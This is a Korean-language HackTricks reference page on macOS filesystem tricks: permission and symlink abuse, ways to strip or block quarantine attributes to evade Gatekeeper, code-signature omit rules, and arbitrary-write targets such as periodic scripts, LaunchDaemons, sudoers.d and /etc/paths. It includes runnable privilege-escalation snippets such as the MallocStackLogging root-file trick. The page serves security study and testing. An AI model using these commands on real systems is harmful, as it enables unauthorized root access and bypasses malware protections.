# macOS FS 트릭

<details>

<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team 전문가)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **PDF로 HackTricks 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com) 획득
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **해킹 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## POSIX 권한 조합

**디렉토리**의 권한:

* **읽기** - 디렉토리 항목을 **열거**할 수 있음
* **쓰기** - 디렉토리에 **파일을 삭제/쓰기**할 수 있으며 **빈 폴더를 삭제**할 수 있음.
* 그러나 **쓰기 권한**이 없으면 **비어 있지 않은 폴더를 삭제/수정**할 수 없음.
* 소유권이 없으면 **폴더 이름을 수정**할 수 없음.
* **실행** - 디렉토리를 **탐색**할 수 있음 - 이 권한이 없으면 해당 디렉토리 내의 파일이나 하위 디렉토리에 액세스할 수 없음.

### 위험한 조합

**루트가 소유한 파일/폴더를 덮어쓰는 방법**, 그러나:

* 경로에서 하나의 상위 **디렉토리 소유자**가 사용자인 경우
* 경로에서 하나의 상위 **디렉토리 소유자**가 **쓰기 액세스**를 가진 **사용자 그룹**인 경우
* 사용자 **그룹**이 **파일**에 **쓰기** 액세스 권한을 가짐

이전 조합 중 하나로 공격자는 특권 임의 쓰기를 얻기 위해 예상 경로에 **sym/hard 링크를 삽입**할 수 있음.

### 폴더 루트 R+X 특수 케이스

**루트만 R+X 액세스 권한을 가진 디렉토리**에 파일이 있는 경우, 해당 파일은 **다른 사람에게 접근할 수 없음**. 따라서 사용자가 읽을 수 있는 파일을 **이 제한 때문에 읽을 수 없는** 폴더에서 **다른 폴더로 이동**하는 취약점이 있다면 이 파일을 읽기 위해 악용될 수 있음.

예시: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## 심볼릭 링크 / 하드 링크

특권 프로세스가 **사용자가 제어할 수 있는 파일**에 데이터를 쓰거나 **낮은 권한을 가진 사용자가 이전에 생성한 파일**에 데이터를 쓰고 있는 경우, 사용자는 심볼릭 또는 하드 링크를 통해 해당 파일을 다른 파일로 **가리킬 수 있으며**, 특권 프로세스는 해당 파일에 쓸 것임.

공격자가 특권 상승을 위해 임의 쓰기를 악용할 수 있는 곳을 확인하려면 다른 섹션을 확인하세요.

## .fileloc

**`.fileloc`** 확장자가 있는 파일은 다른 응용프로그램이나 이진 파일을 가리킬 수 있어서 해당 파일을 열면 응용프로그램/이진 파일이 실행됨.\
예시:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## 임의의 FD

만약 **프로세스가 높은 권한으로 파일이나 폴더를 열도록** 만들 수 있다면, **`crontab`**을 남용하여 `/etc/sudoers.d`에 있는 파일을 **`EDITOR=exploit.py`**로 열도록 하여, `exploit.py`가 `/etc/sudoers` 내부의 파일에 대한 FD를 얻고 남용할 수 있습니다.

예시: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Quarantine xattrs 트릭 방지

### 제거하기
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable 플래그

만약 파일/폴더가 이 불변 속성을 가지고 있다면 xattr을 적용할 수 없습니다.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs 마운트

**devfs** 마운트는 **xattr을 지원하지 않습니다**, 자세한 정보는 [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)에서 확인할 수 있습니다.
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

이 ACL은 파일에 `xattrs`를 추가하는 것을 방지합니다.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** 파일 형식은 파일과 해당 ACE(접근 제어 항목)를 복사합니다.

[**소스 코드**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)에서 볼 수 있듯이, xattr인 **`com.apple.acl.text`**에 저장된 ACL 텍스트 표현은 압축 해제된 파일에서 ACL로 설정됩니다. 따라서, ACL을 포함하는 zip 파일로 응용 프로그램을 압축하고 다른 xattr이 기록되지 않도록 하는 경우... 격리 xattr이 응용 프로그램에 설정되지 않았습니다:

자세한 정보는 [**원본 보고서**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)를 확인하십시오.

이를 복제하려면 먼저 올바른 acl 문자열을 가져와야 합니다:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

실제로 필요하지는 않지만 그냥 거기에 둡니다:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## 코드 서명 우회

번들에는 **`_CodeSignature/CodeResources`** 파일이 포함되어 있으며 이 파일에는 번들 내의 모든 **파일**의 **해시**가 포함되어 있습니다. CodeResources의 해시는 또한 **실행 파일에 포함**되어 있기 때문에 해당 부분을 건드릴 수 없습니다.

그러나 일부 파일의 서명은 확인되지 않을 수 있습니다. 이러한 파일은 plist에 omit 키가 있는 것과 같습니다:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
다음과 같이 CLI에서 리소스의 서명을 계산할 수 있습니다:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## dmg 파일 시스템 장착

사용자는 기존 폴더 위에도 사용자 정의 dmg를 장착할 수 있습니다. 다음은 사용자가 사용자 정의 내용을 포함한 사용자 정의 dmg 패키지를 만드는 방법입니다:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

일반적으로 macOS는 `com.apple.DiskArbitration.diskarbitrationd` Mach 서비스와 통신하여 디스크를 마운트합니다(`/usr/libexec/diskarbitrationd`에서 제공). LaunchDaemons plist 파일에 `-d` 매개변수를 추가하고 다시 시작하면 `/var/log/diskarbitrationd.log`에 로그를 저장합니다.\
그러나 `hdik` 및 `hdiutil`과 같은 도구를 사용하여 `com.apple.driver.DiskImages` kext와 직접 통신할 수 있습니다.

## 임의 쓰기

### 주기적인 sh 스크립트

스크립트가 **쉘 스크립트**로 해석될 수 있다면 매일 트리거될 **`/etc/periodic/daily/999.local`** 쉘 스크립트를 덮어쓸 수 있습니다.

다음과 같이 이 스크립트의 실행을 **가짜**로 만들 수 있습니다: **`sudo periodic daily`**

### 데몬

임의의 **LaunchDaemon**을 작성하고 **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**와 같은 plist를 사용하여 임의의 스크립트를 실행할 수 있습니다:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### Sudoers 파일

**임의 쓰기** 권한이 있다면 **`/etc/sudoers.d/`** 폴더 내에 **sudo** 권한을 부여하는 파일을 생성할 수 있습니다.

### PATH 파일

**`/etc/paths`** 파일은 PATH 환경 변수를 채우는 주요 위치 중 하나입니다. 이 파일을 덮어쓰려면 루트여야 하지만, **특권 프로세스**에서 **전체 경로 없이 명령어를 실행**하는 경우, 이 파일을 수정하여 **해킹**할 수 있습니다.

`/etc/paths.d`**에 파일을 작성하여 `PATH` 환경 변수에 새 폴더를 로드할 수도 있습니다.

## 다른 사용자로부터 쓰기 가능한 파일 생성

이렇게 하면 나에게 쓰기 가능한 파일을 생성할 수 있습니다. 이 파일은 루트 소유이지만 나에게 쓰기 권한이 있습니다 ([**여기에서 코드 확인**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). 이것 또한 권한 상승으로 작동할 수 있습니다:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX 공유 메모리

**POSIX 공유 메모리**는 POSIX 호환 운영 체제에서 프로세스가 공통 메모리 영역에 액세스할 수 있게 하여 다른 프로세스 간 통신 방법보다 빠른 통신을 가능하게 합니다. 이는 `shm_open()`을 사용하여 공유 메모리 객체를 생성하거나 열고, `ftruncate()`를 사용하여 크기를 설정하고, `mmap()`을 사용하여 프로세스의 주소 공간에 매핑하는 과정을 포함합니다. 프로세스는 이후 이 메모리 영역에서 직접 읽고 쓸 수 있습니다. 동시 액세스를 관리하고 데이터 손상을 방지하기 위해 종종 뮤텍스나 세마포어와 같은 동기화 메커니즘을 사용합니다. 마지막으로, 프로세스는 `munmap()` 및 `close()`를 사용하여 공유 메모리를 언맵하고 닫은 후, 선택적으로 `shm_unlink()`를 사용하여 메모리 객체를 제거할 수 있습니다. 이 시스템은 여러 프로세스가 공유 데이터에 빠르게 액세스해야 하는 환경에서 효율적이고 빠른 IPC에 특히 효과적입니다.

<details>

<summary>생산자 코드 예시</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>소비자 코드 예시</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOS 보호된 디스크립터**는 macOS에 도입된 보안 기능으로, 사용자 응용 프로그램에서 **파일 디스크립터 작업**의 안전성과 신뢰성을 향상시킵니다. 이러한 보호된 디스크립터는 파일 디스크립터에 특정 제한 또는 "가드"를 연결하여 커널에서 강제하는 방법을 제공합니다.

이 기능은 **무단 파일 액세스** 또는 **경쟁 조건**과 같은 특정 유형의 보안 취약점을 방지하는 데 특히 유용합니다. 이러한 취약점은 예를 들어 스레드가 파일 설명에 액세스하고 **다른 취약한 스레드에게 액세스 권한을 부여**하거나 파일 디스크립터가 취약한 자식 프로세스에 **상속**될 때 발생합니다. 이 기능과 관련된 일부 함수는 다음과 같습니다:

* `guarded_open_np`: 가드가 있는 FD 열기
* `guarded_close_np`: 닫기
* `change_fdguard_np`: 설명자에 대한 가드 플래그 변경 (가드 보호 제거 포함)

## 참고 자료

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 영웅까지 AWS 해킹 배우기!</summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 PDF로 HackTricks를 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>
